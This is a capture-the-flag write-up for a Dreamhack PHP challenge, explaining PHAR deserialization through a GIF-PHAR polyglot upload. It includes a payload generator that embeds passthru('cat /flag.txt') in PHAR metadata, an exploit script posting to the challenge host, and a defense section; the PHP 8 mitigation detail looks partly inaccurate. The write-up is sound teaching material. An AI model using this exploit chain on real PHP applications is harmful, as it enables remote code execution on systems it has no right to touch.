# 🧐 pharmacy

## Overview

This writeup analyzes a PHP file upload vulnerability that leverages PHAR deserialization to achieve Remote Code Execution (RCE). The challenge demonstrates how PHAR files can be disguised as GIF images to bypass file type validation and trigger PHP object deserialization.

**Description**: "When things were wild, there was a good, old pharmacy... with a supermarket?"

---

## Background: PHAR Files and Deserialization

### What is PHAR?

PHAR (PHP Archive) is a file format that allows packaging PHP applications and libraries into a single file. Key characteristics:

- **Single file packaging**: Multiple PHP files and resources in one compressed archive
- **Executable**: Can contain runnable PHP applications
- **Metadata support**: Stores serialized PHP objects in metadata section

### PHAR File Structure

A PHAR file consists of four main components:

1. **Stub**: Must contain `<?php __HALT_COMPILER(); ?>` to be recognized as PHAR
2. **Manifest**: Contains metadata including serialized PHP objects ⚠️ **(Vulnerability point)**
3. **File Contents**: Actual data/files within the archive
4. **Signature**: Optional verification data

### The Vulnerability Mechanism

When PHP processes PHAR files through certain functions, it automatically deserializes the metadata:

```php
// These functions trigger PHAR metadata deserialization:
file_exists("phar://malicious.phar/file.txt");
file_get_contents("phar://malicious.phar/file.txt");
is_file("phar://malicious.phar/file.txt");
// ... and many others
```

**Key Point**: Unlike `unserialize()`, PHAR deserialization happens implicitly during file operations.

---

## Code Analysis

### index.php

```php
<?php
require("supermarket.php");

$targetDirectory = "uploads/";
$uploadOK = 1;

if( isset($_POST["submit"])) {
    echo '<pre class="file-upload-form">';
    $tmpFile = $_FILES["fileToUpload"]["tmp_name"];
    $currentFile = $_FILES["fileToUpload"]["name"];
    $fileExtension = strtolower(pathinfo($currentFile, PATHINFO_EXTENSION));

    // File type validation
    if (mime_content_type($tmpFile) !== "image/gif" || $fileExtension !== "gif") {
        echo "Prescription not gif!\n";
        $uploadOK = 0;
    }

    if ($uploadOK == 0) {
        echo "Prescription upload failed.\n";
    } else {
        $randomFileName = bin2hex(random_bytes(16));
        $targetFile = $targetDirectory . $randomFileName . "." . $fileExtension;
        
        if (move_uploaded_file($tmpFile, $targetFile)) {
            // CRITICAL: PHAR wrapper injection point
            if (isset($_POST['emergent']))
                $targetFile = 'phar://' . $targetFile;
            else
                $targetFile = $targetFile;

            // VULNERABILITY: file_exists() triggers PHAR deserialization
            if (file_exists($targetFile)) {
                echo "Prescription submitted!\n";
            }
        } else {
            echo "Prescription upload failed.\n";
        }
    }
    echo '</pre>';
}
?>
```

**Vulnerability Analysis:**

1. **File Type Bypass**: Only checks MIME type and extension for GIF
2. **PHAR Wrapper Injection**: `emergent` parameter adds `phar://` prefix
3. **Deserialization Trigger**: `file_exists()` causes automatic metadata deserialization

### supermarket.php

```php
<?php
function goodbye($customer) {
    echo "Good bye, $customer!\n";
}

class Supermarket {
    public $greet = 'goodbye';
    public $customer = 'dream';
    
    function __destruct() {
        // GADGET: Arbitrary function execution
        call_user_func($this->greet, $this->customer);
    }
}
?>
```

**Gadget Analysis:**

- `__destruct()` magic method executes when object is destroyed
- `call_user_func()` enables arbitrary function calls
- Both `$greet` and `$customer` are controllable public properties
- Perfect RCE gadget: `call_user_func("system", "malicious_command")`

---

## Exploitation Process

### Step 1: Create Malicious PHAR File

**payload_gen.php:**

```php
<?php
class Supermarket {
    public $greet = 'goodbye';
    public $customer = 'dream';
    
    function __destruct() {
        call_user_func($this->greet, $this->customer);
    }
}

// Create PHAR file
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');

// Add GIF header to bypass file type check
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');

// Create malicious object
$object = new Supermarket();
$object->greet = "passthru";           // Function to execute
$object->customer = "cat /flag.txt";   // Command to run

// Embed object in PHAR metadata
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```

### Step 2: Generate PHAR Polyglot

```bash
# Generate PHAR file
php -d phar.readonly=0 payload_gen.php

# Rename to bypass extension check
mv payload.phar payload.gif
```

**Result**: A file that appears as GIF but contains PHAR structure with malicious metadata.

### Step 3: Upload and Trigger

**exploit.py:**

```python
import requests

url = 'http://host3.dreamhack.games:16442'

# POST data to trigger PHAR processing
data = {
    'submit': 1,
    'emergent': 1,  # Adds phar:// wrapper
}

# Upload malicious PHAR-GIF polyglot
with open('payload.gif', 'rb') as f:
    r = requests.post(url, files={'fileToUpload': f}, data=data)

print(r.text)
```

### Step 4: Execution Flow

1. **Upload**: `payload.gif` uploaded to `uploads/` directory
2. **PHAR Wrapper**: `emergent=1` makes `$targetFile = 'phar://uploads/random.gif'`
3. **Deserialization**: `file_exists()` processes PHAR metadata
4. **Object Creation**: `Supermarket` object instantiated from metadata
5. **Destruction**: Object goes out of scope, `__destruct()` called
6. **RCE**: `call_user_func("passthru", "cat /flag.txt")` executes

---

## Technical Deep Dive

### PHAR vs Traditional Deserialization

| Aspect | PHAR Deserialization | `unserialize()` |
|--------|---------------------|-----------------|
| **Trigger** | File operations with `phar://` | Direct function call |
| **Detection** | Often overlooked in code review | Obvious vulnerability point |
| **Magic Methods** | Primarily `__destruct()`, `__wakeup()` | All magic methods available |
| **Bypass Potential** | High (disguised as other file types) | Medium (input filtering) |

### File Type Bypass Technique

The key to this attack is creating a **polyglot file**:

```
GIF89a<?php __HALT_COMPILER();?>
[PHAR MANIFEST WITH SERIALIZED OBJECT]
[FILE CONTENTS]
```

- **GIF Header**: `GIF89a` satisfies `mime_content_type()` check
- **PHAR Stub**: `<?php __HALT_COMPILER();?>` makes it valid PHAR
- **Metadata**: Contains serialized malicious object

### RCE Gadget Chain

```php
// When PHAR is processed:
1. file_exists("phar://payload.gif/test.txt")
2. PHAR metadata deserialized
3. Supermarket object created with:
   - $greet = "passthru"
   - $customer = "cat /flag.txt"
4. Object destruction triggers __destruct()
5. call_user_func("passthru", "cat /flag.txt")
6. Command execution: cat /flag.txt
```

---

## Defense Mechanisms

### 1. Input Validation

```php
// Validate file content, not just headers
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($tmpFile);

// Check actual file structure
if (!getimagesize($tmpFile)) {
    throw new Exception("Invalid image file");
}
```

### 2. Disable PHAR Stream Wrapper

```php
// In php.ini or runtime
stream_wrapper_unregister('phar');
```

### 3. File Operation Restrictions

```php
// Avoid user-controlled paths in file operations
if (strpos($userPath, 'phar://') !== false) {
    throw new Exception("PHAR protocol not allowed");
}
```

### 4. PHP Version Upgrade

- **PHP 8.0+**: PHAR deserialization disabled by default
- Requires explicit `Phar::loadPhar()` for deserialization

---

## Real-world Examples

### WordPress PHAR Vulnerabilities

Historical cases where WordPress plugins were vulnerable:

```php
// Vulnerable: User-controlled file path
if (file_exists($_GET['file'])) {
    // Process file
}

// Exploit: ?file=phar://uploaded_image.jpg/test.txt
```

### TCPDF Library Case

```php
// TCPDF processes HTML <img> tags
public function Image($file, $x='', $y='', ...) {
    if (!@file_exists($file)) {
        // Error handling
    }
}
```

**Attack vector**: `<img src="phar://malicious.gif/image.png">`

---

## Exploitation Result

When the exploit is executed successfully:

```
Prescription submitted!
DH{sample_flag_here}
Good bye, dream!
```

The flag is extracted via command execution through the PHAR deserialization chain.

---

## Lessons Learned

### For Developers

1. **Never trust file extensions/MIME types alone**
2. **Validate actual file content structure**
3. **Be aware of implicit deserialization in file operations**
4. **Restrict or disable PHAR stream wrapper if not needed**
5. **Use modern PHP versions with better security defaults**

### For Security Researchers

1. **Look for file upload + file operation combinations**
2. **Search for magic methods in available classes**
3. **Consider polyglot file techniques for filter bypass**
4. **Understand different deserialization vectors beyond `unserialize()`**

---

## Technical Summary

- **Vulnerability Type**: PHP Object Injection via PHAR Deserialization
- **Attack Vector**: File Upload + PHAR Stream Wrapper
- **Bypass Technique**: GIF-PHAR Polyglot File
- **Exploitation Method**: Magic Method Gadget Chain
- **Impact**: Remote Code Execution
- **Mitigation**: Input validation, stream wrapper restrictions, PHP version upgrade

This challenge demonstrates the subtle but powerful nature of PHAR-based attacks, showing how seemingly innocuous file operations can lead to complete system compromise when combined with object injection vulnerabilities.
